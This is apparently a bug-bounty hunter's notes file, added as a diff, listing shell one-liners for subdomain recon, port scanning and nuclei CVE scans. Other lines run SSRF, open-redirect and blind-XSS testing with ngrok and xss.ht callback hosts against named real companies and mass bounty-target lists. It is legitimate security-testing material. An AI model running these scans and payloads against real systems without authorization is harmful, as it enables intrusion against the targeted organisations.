@@ -1,0 +1,157 @@
+
+1. subfinder -d lifeomic.com | hakrawler
+
+Not relevant results need more research
+ 
+2. waybackurls target >> waybackdata
+cat waybackdata | hakrawler -depth 3 -plain | tee waybackdata-spider.txt 
+cat waybackdata-spider.txt | gf redirect | tee -a redirect.txt
+
+
+3. Get all target parameters: `gau http://riders.uber.com|grep -Eio '\?\S*'|tr '?' ' '|awk '{print $1}'|tr '&' '\n'|tr '='  ' '|awk '{print $1}'|sort -u`
+or 
+ gau http://domain.com | unfurl keys
+
+
+4.  echo "lifeomic.com" | waybackurls | ssrf
+
+
+or cat ../h1domains/wildcards.txt | waybackurls | ssrf
+
+Testing all waybackurls for ssrf (very good)
+
+validating only for ssrf and openredirect use ssrfire tool (very good)
+
+gau domain >> hosts
+cat hosts | ssrf
+then run
+ ./ssrfire.sh payfit.com  http://280bcfcd.ngrok.io hosts
+
+or 
+
+tool by hussien very good
+
+./ssrfhussien.sh paytm.com  http://280bcfcd.ngrok.io
+
+
+5.  python subx.py -d roblox.com -w paths -a "aquatone"
+or
+for i in `cat ../h1domains/wildcards` ; do python subx.py -d $i -w paths -a "aquatone" ; done
+cat index | grep "200 OK" | cut -d " "  -f 2 | sort -u
+Identifying root domains and checking the endpoints using meg wrt paths
+
+
+6.  Verify good for validating xss , redirect , potential (need to update the list)
+
+python3 paramspider.py --domain paytm.com --exclude svg,jpg,css,js --output /root/newtargets/paytm.txt
+or 
+for i in `cat ../h1domains/with_bounties.txt`; do python3 paramspider.py -d $i -e php,js,css,woff,jpg -o $i ; done && for i in `output/*` ; do ffuf -u $i -w ssrf -o /root/tools/ParamSpider/ffufresults/$i.txt ; done 
+
+gf redirect paytm.txt
+gf xss paytm.txt
+gf potential paytm.txt
+
+
+7.   To test for Openredirect
+
+python3.7 openredirex.py -u "https://vulnerable.com/?url=FUZZ" -p payloads.txt --keyword FUZZ  
+python3.7 openredirex.py -l /root/tools/h1domains/with_bounties.txt -p payloads.txt --keyword FUZZ
+or
+./redir.py -w domains.txt -p redirects -d evil.com -a parameters.txt -o redirect.txt
+
+
+8.    Fffuf
+
+ffuf -u http://FUZZsub.example.com -w wordlist
+
+ffuf -u HFUZZ/WFUZZ -w payfitallendpoints1.txt:HFUZZ -w ssrf.txt:WFUZZ -mode clusterbomb
+
+ffuf -c -u  HFUZZ?PFUZZ=WFUZZ -w hosts.txt:HFUZZ -w ssrf.txt:WFUZZ -w par.txt:PFUZZ
+
+https://hfuzz/redirect?PFUZZ=FUZZ
+
+9. Subdomain takeover
+
+Recon target.txt
+
+tail -f takeovers | grep -v "Vulnerable"
+
+10. This one liner extracts all api end points for angular js and angular java script files
+curl -s URL | grep -Po "(\/)((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0-9\{\}]+))" | sort -u
+
+11. xss 
+
+cat subdomains.txt | waybackurls >> wayback.txt 
+cat subdomains.txt | hakrawler -depth 3 -plain >> spider.txt 
+cat spider.txt wayback.txt | kxss == XSS $$$ 
+
+or xsstrike
+or
+
+gospider -S tageturls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'|grep "=" | qsreplace -a | dalfox pipe -o result.txt
+
+or 
+
+cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind 
+
+or 
+
+Dalfox:
+dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff -b https://hahwul.xss.ht
+dalfox file urls_file --custom-payload ./mypayloads.txt
+cat urls_file | dalfox pipe -H "AuthToken: bbadsfkasdfadsf87"  
+echo "target.com" | waybackurls | grep "=" | dalfox pipe -b https://hemadomain.xss.ht
+
+
+12.  To run ffuf or dirsearch using all txt file.
+
+cat wildstar.txt | xargs -P20 -I@@ bash -c "{ python3 /home/zoid/tools/dirsearch/dirsearch.py -u "https://@@" -w /home/zoid/wordlist.txt -e html, json, xml, txt, asp --simple-report=report.txt -b --threads 100 ;}"
+
+13. Subdomain takeover
+
+subfinder -dL all.txt --silent | tee -a subdomains.txt
+subjack -w subdomains.txt -ssl | tee -a takeovers | grep -v "Vulnerable"
+
+14. cat /root/wordlist/namahsecdomains | xargs -P20 -I@@ bash -c "{ gau "@@" | tee -a newhosts.txt; }"
+
+15. All hackerone and bugcrwod data 
+https://github.com/arkadiyt/bounty-targets-data  
+cat bugcrowd_data.json | grep "target" | cut -d ':' -f2 | grep -v "{" | grep -v "https" | cut -d ' ' -f2 | grep -iE ".com|.net|.org" | grep -v "*" | grep -v "/" | sed 's/\"$//' | sed 's/\"//' | sort -u >> subdomains.txt
+cat hackerone_data.json | grep "asset_identifier" | cut -d ':' -f2 | grep -v "{" | grep -v "https" | cut -d ' ' -f2 | grep -iE ".com|.net|.org" | grep -v "*" | grep -v "/" | sed 's/\,//' | sed 's/\"$//' | sed 's/\"//'
+
+cat subdomains-all.txt | xargs -P10 -I@@ bash -c "{ ffuf -u "@@"?PFUZZ=WFUZZ  -w ssrf.txt:WFUZZ -w parameters.txt:PFUZZ; }"
+https://rez0.blog/  
+
+16. Oneforall:
+python3 oneforall.py --target paytm.com --brute True --port small --takeover True run
+
+17. nabu:(port scanning tool)
+naabu -host hackerone.com -o output.txt
+naabu -hL hosts.txt -o ~/path/to/output.txt  
+naabu -hL hosts.txt -oD ~/path/to/output  
+
+18. Nuclie tool:
+
+subfinder -d hackerone.com -silent | httprobe | nuclei -t nuclei-templates/cves/ -o results.txt  
+
+nuclei -l live_final.txt -t /root/tools/nuclei-templates/cves/CVE-2017-9506.yaml -o results.txt
+
+ls /root/tools/nuclei-templates/all/* | xargs -P10 -I@@ bash -c "{ nuclei -l live_final.txt  -t  "@@" -o results.txt; }"
+
+19 :
+
+Find subdomains:- amass enum -brute -w /root/wordlist.txt -d target -o target.txt 
+Scan ports:- naabu -ports full -exclude-ports 80,443 -hL target.txt -o out.txt 
+Find vulnerabilities:- nuclei -l out.txt -t nuclei-templates/cves/ -o results
+
+20 Testing for blind xss 
+
+for i in `cat ../bounty-targets-data/data/domains.txt `; do echo "$i" | waybackurls | grep "=" | ~/go/bin/dalfox pipe -b https://z0id.xss.ht; done
+
+21. httpx -l live-responsible.txt -title -content-length -status-code
+
+22. All latest doamins
+
+https://chaos.projectdiscovery.io/#/  
+
+
